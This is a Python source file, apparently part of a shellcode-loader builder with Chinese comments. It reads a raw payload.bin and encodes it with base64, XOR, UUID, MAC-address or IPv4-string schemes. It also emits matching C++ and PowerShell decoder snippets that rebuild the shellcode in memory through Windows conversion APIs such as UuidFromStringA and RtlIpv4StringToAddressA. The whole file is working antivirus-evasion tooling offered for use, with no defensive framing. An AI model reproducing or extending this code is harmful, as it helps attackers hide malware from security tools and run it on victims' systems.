#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2022-02-26 12:15:01
# @Author  : Your Name (you@example.org)
# @Link    : http://example.org
# @Version : $Id$

import random
import string
import uuid

from base64 import b64encode


class Encrypt(object):
	"""docstring for Encrypt"""
	'''
	Shellcode加密类
	:: param: None
	:: return: None
	'''


	def __init__(self, file="payload.bin"):
		'''
		初始化函数
		:: param: string -> file
		:: return: None
		'''

		with open(file, 'rb') as shellcodeFileHandle:
			self.shellcodeBytes = bytearray(shellcodeFileHandle.read())
			shellcodeFileHandle.close()

		self.key = ''
		self.CipherText = ''
		self.cppDecode = ''
		self.EncryptLib = ''
	

	def base64_encode(self):
		'''
		Base64编码函数
		:: param: None
		:: return: None
		'''

		shellcodeHexNoneZero = ""
		shellcodeHexNoneZero += "".join(['%02x' % i for i in self.shellcodeBytes])
		self.CipherText = b64encode(shellcodeHexNoneZero.encode()).decode()
		self.cppDecode = 'int len = 0;\n\tchar text[3000] = { 0 };\n\tbase64_decode(Ciphertext, (int)strlen(Ciphertext), text, &len);\n\n\tunsigned int char_in_hex;\n\tchar *shellcode = text;\n\tunsigned int iterations = strlen(shellcode);\n\n\tfor (unsigned int i = 0; i < iterations - 1; i++) {\n\t\tsscanf_s(shellcode + 2 * i, "%2X", &char_in_hex);\n\t\tshellcode[i] = (char)char_in_hex;\n\t}'
		self.ps1Decode = '$text = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($CipherText))\n\t[Byte[]]$String = New-Object Byte[] 0\n\n\tfor ($x = 1; $x -lt $text.Length; $x+=2){\n\t\t$b = -join ($text[$x - 1], $text[$x])\n\t\t$String += [int]"0x$b"\n\t}'


	def xor(self):
		'''
		异或加密函数
		:: param: None
		:: return: None
		'''

		self.key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
		KeyLen = len(self.key)
		keyAsInt = list(map(ord, self.key))
		CipherBytes = bytes(bytearray(((self.shellcodeBytes[i] ^ keyAsInt[i % KeyLen]) for i in range(0,len(self.shellcodeBytes)))))

		self.CipherText = "\\x"
		self.CipherText += "\\x".join(['%02x' % i for i in CipherBytes])

		self.cppDecode = 'char shellcode[sizeof Ciphertext];\n\tchar key[] = "<key>";\n\tint j = 0;\n\tfor (int i = 0; i < sizeof Ciphertext; i++) {\n\t\tif (j == sizeof key - 1) j = 0;\n\n\t\tshellcode[i] = Ciphertext[i] ^ key[j];\n\t\tj++;\n\t}'.replace('<key>', self.key)
		self.ps1Decode = '$CipherText=$CipherText.split("\\x") | Where-Object { $_ -ne "" }\n\n\t[int[]][char[]]$asc = "<key>"\n\n\t$j = 0\n\t[Byte[]]$String = New-Object Byte[] 0\n\n\tfor ($x=0;$x -lt $CipherText.Length;$x++){\n\t\tif ($j -eq $asc.Length){\n\t\t\t$j = 0\n\t\t}\n\t\t$text = $CipherText[$x]\n\t\t$String += [int]"0x$text" -bxor $asc[$j]\n\t\t$j++\n\t}'.replace('<key>', self.key)
		

	def aes(self, key):

		pass


	def touuid(self):
		'''
		uuid加密函数
		:: param: None
		:: return: None
		'''

		shellcodeByte = bytes(self.shellcodeBytes)
		if len(shellcodeByte) % 16 != 0:
			shellcodeByte += b"\x00" * (16 - (len(shellcodeByte) % 16))

		for i in range(0, len(shellcodeByte), 16):
			uuidString = str(uuid.UUID(bytes_le=shellcodeByte[i:i + 16]))
			self.CipherText += '"' + uuidString + '", '

		self.cppDecode = 'DWORD_PTR hptr = (DWORD_PTR)addr;\n\tint elems = sizeof(Ciphertext) / sizeof(Ciphertext[0]);\n\n\tfor (int i = 0; i < elems; i++) {\n\t\tRPC_STATUS status = UuidFromStringA((RPC_CSTR)Ciphertext[i], (UUID*)hptr);\n\t\thptr += 16;\n\t}'
		self.ps1Decode = '$hptr = $var_buffer\n\t$var_u2s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address RpcRT4.dll UuidFromStringA), (func_get_delegate_type @([String], [IntPtr]) ([String])))\n\n\tfor ($x = 0;$x -lt $CipherText.Length;$x++){\n\t\t$var_u2s.Invoke($CipherText[$x], $hptr)\n\t\t[long]$hptr += 16;\n\t}'
		self.EncryptLib = ' ./lib/RpcRT4.Lib'


	def tomac(self):
		'''
		mac加密函数
		:: param: None
		:: return: None
		'''

		shellcodeHexNoneZero = bytes(self.shellcodeBytes)
		if len(shellcodeHexNoneZero) % 6 != 0:
			shellcodeHexNoneZero += b"\x00" * int((6 - (len(shellcodeHexNoneZero) % 6)))

		for i in range(0, int(len(shellcodeHexNoneZero)), 6):
			self.CipherText += '"' + "-".join(['%02x' % j for j in shellcodeHexNoneZero[i:i+6]]) + '", '

		self.cppDecode = 'DWORD_PTR hptr = (DWORD_PTR)addr;\n\tint elems = sizeof(Ciphertext) / sizeof(Ciphertext[0]);\n\n\tfor (int i = 0; i < elems; i++) {\n\t\tRtlEthernetStringToAddressA(Ciphertext[i], &Ciphertext[i], (DL_EUI48*)hptr);\n\t\thptr += 6;\n\t}'
		self.ps1Decode = '[Byte[]]$String = New-Object Byte[] 0\n\n\tfor ($x = 0;$x -lt $CipherText.Length; $x++){\n\t\t$text = $CipherText[$x].split("-")\n\t\tfor ($y = 0;$y -lt $text.Length;$y++){\n\t\t\t$tmp = $text[$y]\n\t\t\t$String += [int]"0x$tmp"\n\t\t}\n\t}'
		self.EncryptLib = ' ./lib/ntdll.lib'


	def toipv4(self):
		'''
		ipv4函数
		:: param: None
		:: return: None
		'''

		shellcodelist = [str(i) for i in self.shellcodeBytes]
		for i in range(0, len(shellcodelist), 4):
			if len('.'.join(shellcodelist[i:i+4])) == 15:
				self.CipherText += '"' + '.'.join(shellcodelist[i:i+4]) + '", '
			else:
				self.CipherText += '"' + '.'.join(shellcodelist[i:i+4]) + '\\x00' * (15 - len('.'.join(shellcodelist[i:i+4]))) + '", '

		self.cppDecode = 'DWORD_PTR hptr = (DWORD_PTR)addr;\n\tint elems = sizeof(Ciphertext) / sizeof(Ciphertext[0]);\n\n\tfor (int i = 0; i < elems; i++) {\n\t\tRtlIpv4StringToAddressA(Ciphertext[i], 0, &Ciphertext[i], (in_addr*)hptr);\n\t\thptr += 4;\n\t}'
		self.ps1Decode = '[Byte[]]$String = New-Object Byte[] 0\n\n\tfor ($x = 0;$x -lt $CipherText.Length;$x++){\n\t\t$text = $CipherText[$x].split("\\")[0].split(".")\n\t\tfor ($y = 0; $y -lt $text.Length;$y++){\n\t\t\t$tmp = $text[$y]\n\t\t\t$String += [int]$tmp\n\t\t}\n\t}'
		self.EncryptLib = ' ./lib/ntdll.Lib'


	def diy(self):
		pass



